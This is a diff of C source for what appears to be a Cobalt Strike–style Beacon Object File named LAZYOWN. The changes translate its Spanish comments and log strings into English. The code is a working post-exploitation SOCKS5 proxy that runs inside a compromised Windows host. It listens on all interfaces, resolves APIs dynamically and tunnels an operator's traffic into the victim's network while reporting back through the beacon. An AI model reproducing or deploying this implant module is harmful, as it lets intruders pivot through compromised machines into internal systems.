@@ -2,7 +2,7 @@
 #include <windows.h>
 #include "beacon.h"
 
-/* ===== DECLARACIONES QUE FALTABAN ===== */
+/* ===== MISSING DECLARATIONS ===== */
 typedef unsigned __int64 SOCKET;
 #define INVALID_SOCKET  ((SOCKET)~0)
 #define SOCKET_ERROR    (-1)
@@ -71,13 +71,13 @@ extern PVOID __imp_VirtualAlloc;
 extern PVOID __imp_VirtualFree;
 extern PVOID __imp_CloseHandle;
 
-/* ===== CONSTANTES ===== */
+/* ===== CONSTANTS ===== */
 #define SOCKS5_LISTEN_PORT 9050
 #define SOCKS5_CONTROL_PORT 9051
 #define MAX_PENDING_CONNECTIONS 5
 #define BUFFER_SIZE 4096
 
-/* ===== TIPOS DE FUNCIÓN ===== */
+/* ===== FUNCTION TYPES ===== */
 typedef HMODULE   (WINAPI *LOADLIBRARYA)(LPCSTR);
 typedef FARPROC   (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
 typedef LPVOID    (WINAPI *VIRTUALALLOC)(LPVOID, SIZE_T, DWORD, DWORD);
@@ -86,7 +86,7 @@ typedef HANDLE    (WINAPI *CREATE_EVENTA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPC
 typedef DWORD     (WINAPI *WAITFORSINGLEOBJECT)(HANDLE, DWORD);
 typedef HANDLE    (WINAPI *CREATETHREAD)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
-/* --- red --- */
+/* --- network --- */
 typedef int       (WINAPI *WSASTARTUP)(WORD, LPWSADATA);
 typedef SOCKET    (WINAPI *SOCKETFN)(int, int, int);
 typedef int       (WINAPI *BIND)(SOCKET, const struct sockaddr*, int);
@@ -103,7 +103,7 @@ typedef ULONG     (WINAPI *HTONL)(ULONG);
 typedef USHORT    (WINAPI *HTONS)(USHORT);
 typedef USHORT    (WINAPI *NTOHS)(USHORT);
 
-/* ===== AUXILIARES ===== */
+/* ===== HELPERS ===== */
 static int my_FD_ISSET(SOCKET s, fd_set *set) {
     if (!set) return 0;
     for (u_int i = 0; i < set->fd_count; ++i)
@@ -111,10 +111,10 @@ static int my_FD_ISSET(SOCKET s, fd_set *set) {
     return 0;
 }
 
-/* ===== VARIABLE GLOBAL ===== */
+/* ===== GLOBAL VARIABLE ===== */
 static HANDLE g_hShutdownEvent = NULL;
 
-/* ===== MANEJADOR SOCKS5 (solo después de handshake confirmado) ===== */
+/* ===== SOCKS5 HANDLER (only after confirmed handshake) ===== */
 static void HandleSocks5Connection(SOCKET client_sock,
     CONNECT pConnect, RECV pRecv, SEND pSend,
     WSAGETLASTERROR pWSAGetLastError,
@@ -127,7 +127,7 @@ static void HandleSocks5Connection(SOCKET client_sock,
     SELECT pSelect = (SELECT)((GETPROCADDRESS)__imp_GetProcAddress)(hWs2_32, "select");
     if (!pCloseSocket || !pSelect) return;
 
-    /* ---- Leemos solicitud completa ---- */
+    /* ---- Read full request ---- */
     int r = 0;
     while (r < 4) {
         int r2 = pRecv(client_sock, buf + r, 4 - r, 0);
@@ -151,7 +151,7 @@ static void HandleSocks5Connection(SOCKET client_sock,
         }
         dst.sin_addr.s_addr = *(ULONG*)(buf + 4);
         dst.sin_port = *(USHORT*)(buf + 8);
-    } else if (buf[3] == 0x03) { /* Dominio */
+    } else if (buf[3] == 0x03) { /* Domain */
         int r2 = pRecv(client_sock, buf + 4, 1, 0);
         if (r2 != 1) return;
         int dlen = (unsigned char)buf[4];
@@ -180,7 +180,7 @@ static void HandleSocks5Connection(SOCKET client_sock,
         return;
     }
 
-    /* ---- Conectamos al destino ---- */
+    /* ---- Connect to destination ---- */
     SOCKETFN pSocketFn = (SOCKETFN)((GETPROCADDRESS)__imp_GetProcAddress)(hWs2_32, "socket");
     if (!pSocketFn) return;
     SOCKET tgt = pSocketFn(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -191,27 +191,27 @@ static void HandleSocks5Connection(SOCKET client_sock,
     }
     if (pConnect(tgt, (struct sockaddr*)&dst, sizeof(dst)) == SOCKET_ERROR) {
         int err = pWSAGetLastError();
-        BeaconPrintf(CALLBACK_ERROR, "[SOCKS5] Falló conexión al destino. WSAError: %d\n", err);
+        BeaconPrintf(CALLBACK_ERROR, "[SOCKS5] Failed to connect to destination. WSAError: %d\n", err);
         char rep[10] = {0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0};
         pSend(client_sock, rep, 10, 0);
         pCloseSocket(tgt);
         return;
     }
 
-    /* ---- Respuesta de éxito ---- */
+    /* ---- Success reply ---- */
     char rep[10] = {0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0};
     if (pSend(client_sock, rep, 10, 0) != 10) {
         pCloseSocket(tgt);
         return;
     }
-    BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Túnel establecido hacia %d.%d.%d.%d:%d\n",
+    BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Tunnel established to %d.%d.%d.%d:%d\n",
         (dst.sin_addr.s_addr >> 0) & 0xFF,
         (dst.sin_addr.s_addr >> 8) & 0xFF,
         (dst.sin_addr.s_addr >> 16) & 0xFF,
         (dst.sin_addr.s_addr >> 24) & 0xFF,
         pNtohs(dst.sin_port));
 
-    /* ---- Reenvío bidireccional ---- */
+    /* ---- Bidirectional forwarding ---- */
     while (1) {
         fd_set read_fds;
         struct timeval tv;
@@ -231,40 +231,40 @@ static void HandleSocks5Connection(SOCKET client_sock,
         if (my_FD_ISSET(client_sock, &read_fds)) {
             int n = pRecv(client_sock, buf, BUFFER_SIZE, 0);
             if (n <= 0) {
-                BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Cliente cerró conexión\n");
+                BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Client closed connection\n");
                 break;
             }
             if (((SEND)((GETPROCADDRESS)__imp_GetProcAddress)(hWs2_32, "send"))(tgt, buf, n, 0) != n) {
-                BeaconPrintf(CALLBACK_ERROR, "[SOCKS5] Falló al reenviar al destino\n");
+                BeaconPrintf(CALLBACK_ERROR, "[SOCKS5] Failed to forward to destination\n");
                 break;
             }
-            BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Reenviados %d bytes cliente→destino\n", n);
+            BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Forwarded %d bytes client->destination\n", n);
         }
         if (my_FD_ISSET(tgt, &read_fds)) {
             int n = pRecv(tgt, buf, BUFFER_SIZE, 0);
             if (n <= 0) {
-                BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Destino cerró conexión\n");
+                BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Destination closed connection\n");
                 break;
             }
             if (pSend(client_sock, buf, n, 0) != n) {
-                BeaconPrintf(CALLBACK_ERROR, "[SOCKS5] Falló al reenviar al cliente\n");
+                BeaconPrintf(CALLBACK_ERROR, "[SOCKS5] Failed to forward to client\n");
                 break;
             }
-            BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Reenviados %d bytes destino→cliente\n", n);
+            BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Forwarded %d bytes destination->client\n", n);
         }
     }
     pCloseSocket(tgt);
-    BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Túnel cerrado\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[SOCKS5] Tunnel closed\n");
 }
 
-/* ===== HILO PRINCIPAL DEL PROXY ===== */
+/* ===== PROXY MAIN THREAD ===== */
 DWORD WINAPI ProxyThread(LPVOID _) {
     LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)__imp_LoadLibraryA;
     GETPROCADDRESS pGetProcAddress = (GETPROCADDRESS)__imp_GetProcAddress;
 
     HMODULE hWs2_32 = pLoadLibraryA("ws2_32.dll");
     if (!hWs2_32) {
-        BeaconPrintf(CALLBACK_ERROR, "[PROXY] No se pudo cargar ws2_32.dll\n");
+        BeaconPrintf(CALLBACK_ERROR, "[PROXY] Could not load ws2_32.dll\n");
         goto cleanup_event;
     }
 
@@ -287,13 +287,13 @@ DWORD WINAPI ProxyThread(LPVOID _) {
     if (!pWSAStartup || !pSocket || !pBind || !pListen || !pAccept || !pConnect ||
         !pRecv || !pSend || !pSelect || !pCloseSocket || !pWSACleanup ||
         !pWSAGetLastError || !pHtonl || !pHtons || !pNtohs) {
-        BeaconPrintf(CALLBACK_ERROR, "[PROXY] Función de red no resuelta\n");
+        BeaconPrintf(CALLBACK_ERROR, "[PROXY] Network function not resolved\n");
         goto cleanup_event;
     }
 
     WSADATA wsa;
     if (pWSAStartup(MAKEWORD(2,2), &wsa) != 0) {
-        BeaconPrintf(CALLBACK_ERROR, "[PROXY] WSAStartup falló\n");
+        BeaconPrintf(CALLBACK_ERROR, "[PROXY] WSAStartup failed\n");
         goto cleanup_event;
     }
 
@@ -306,25 +306,25 @@ DWORD WINAPI ProxyThread(LPVOID _) {
     sa.sin_port = pHtons(SOCKS5_LISTEN_PORT);
 
     if (pBind(srv, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
-        BeaconPrintf(CALLBACK_ERROR, "[PROXY] Bind %d falló\n", SOCKS5_LISTEN_PORT);
+        BeaconPrintf(CALLBACK_ERROR, "[PROXY] Bind %d failed\n", SOCKS5_LISTEN_PORT);
         goto cleanup_srv;
     }
     if (pListen(srv, MAX_PENDING_CONNECTIONS) == SOCKET_ERROR) goto cleanup_srv;
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] Escuchando 0.0.0.0:%d\n", SOCKS5_LISTEN_PORT);
+    BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] Listening on 0.0.0.0:%d\n", SOCKS5_LISTEN_PORT);
 
-    /* ---- Bucle de accept ---- */
+    /* ---- Accept loop ---- */
     while (1) {
         SOCKET cli = pAccept(srv, NULL, NULL);
         if (cli == INVALID_SOCKET) continue;
 
-        /* ---- Leemos y respondemos INMEDIATAMENTE ---- */
+        /* ---- Read and reply IMMEDIATELY ---- */
         unsigned char raw[4] = {0};
         int rr = pRecv(cli, (char*)raw, 4, 0);
         BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] RAW recv: %02X %02X %02X %02X (rr=%d)\n", raw[0], raw[1], raw[2], raw[3], rr);
 
         if (rr <= 0) {
-            if (rr == 0) BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] Cliente cerró conexión (FIN)\n");
+            if (rr == 0) BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] Client closed connection (FIN)\n");
             else BeaconPrintf(CALLBACK_ERROR, "[PROXY] recv() error, cerrando\n");
             pCloseSocket(cli);
             continue;
@@ -334,10 +334,10 @@ DWORD WINAPI ProxyThread(LPVOID _) {
         if (raw[0] == 0x05) {
             char resp[2] = {0x05, 0x00};
             pSend(cli, resp, 2, 0);
-            BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] Respondido 05 00\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[PROXY] Replied 05 00\n");
             HandleSocks5Connection(cli, pConnect, pRecv, pSend, pWSAGetLastError, pHtonl, pHtons, pNtohs);
         } else {
-            BeaconPrintf(CALLBACK_ERROR, "[PROXY] Handshake inválido, cerrando\n");
+            BeaconPrintf(CALLBACK_ERROR, "[PROXY] Invalid handshake, closing\n");
             pCloseSocket(cli);
         }
     }
@@ -356,14 +356,14 @@ cleanup_event:
 
 /* ===== ENTRY POINT BOF ===== */
 void go(char *args, int alen) {
-    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN] Iniciando BOF SOCKS5\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN] Starting SOCKS5 BOF\n");
 
     LOADLIBRARYA pLoadLibraryA = (LOADLIBRARYA)__imp_LoadLibraryA;
     GETPROCADDRESS pGetProcAddress = (GETPROCADDRESS)__imp_GetProcAddress;
 
     HMODULE hK32 = pLoadLibraryA("kernel32.dll");
     if (!hK32) {
-        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] No se pudo cargar kernel32.dll\n");
+        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] Could not load kernel32.dll\n");
         return;
     }
     CREATE_EVENTA pCreateEventA = (CREATE_EVENTA)pGetProcAddress(hK32, "CreateEventA");
@@ -373,28 +373,28 @@ void go(char *args, int alen) {
     CLOSEHANDLE pCloseHandle = (CLOSEHANDLE)pGetProcAddress(hK32, "CloseHandle");
 
     if (!pCreateEventA || !pWaitForSingleObject || !pCreateThread || !pCloseHandle) {
-        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] Función crítica no resuelta\n");
+        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] Critical function not resolved\n");
         return;
     }
 
     g_hShutdownEvent = pCreateEventA(NULL, TRUE, FALSE, NULL);
     if (!g_hShutdownEvent) {
-        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] Falló CreateEventA\n");
+        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] CreateEventA failed\n");
         return;
     }
 
     HANDLE hT = pCreateThread(NULL, 0, ProxyThread, NULL, 0, NULL);
     if (!hT) {
-        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] Falló CreateThread\n");
+        BeaconPrintf(CALLBACK_ERROR, "[LAZYOWN] CreateThread failed\n");
         pCloseHandle(g_hShutdownEvent);
         g_hShutdownEvent = NULL;
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN] Proxy ejecutándose 0.0.0.0:%d\n", SOCKS5_LISTEN_PORT);
+    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN] Proxy running on 0.0.0.0:%d\n", SOCKS5_LISTEN_PORT);
     pWaitForSingleObject(g_hShutdownEvent, INFINITE);
     pCloseHandle(hT);
     pCloseHandle(g_hShutdownEvent);
     g_hShutdownEvent = NULL;
-    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN] BOF finalizado\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[LAZYOWN] BOF finished\n");
 }
